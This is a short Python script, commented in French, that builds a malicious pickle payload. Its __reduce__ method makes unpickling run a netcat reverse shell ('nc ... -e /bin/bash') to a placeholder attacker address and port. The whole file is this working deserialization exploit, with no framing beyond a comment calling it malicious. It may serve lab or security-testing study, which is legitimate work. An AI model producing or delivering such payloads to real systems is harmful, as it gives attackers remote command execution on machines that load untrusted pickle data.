import pickle
import socket
import os

# Génère un payload malicieux qui ouvre une reverse shell
ATTACKER_IP = "127.0.0.1"
ATTACKER_PORT = 9001

class ReverseShell:
    def __reduce__(self):
        cmd = f'nc {ATTACKER_IP} {ATTACKER_PORT} -e /bin/bash'
        return (os.system, (cmd,))

if __name__ == "__main__":
    payload = pickle.dumps(ReverseShell())
    print("[+] Reverse shell payload ready")
    # pickle.loads(payload)
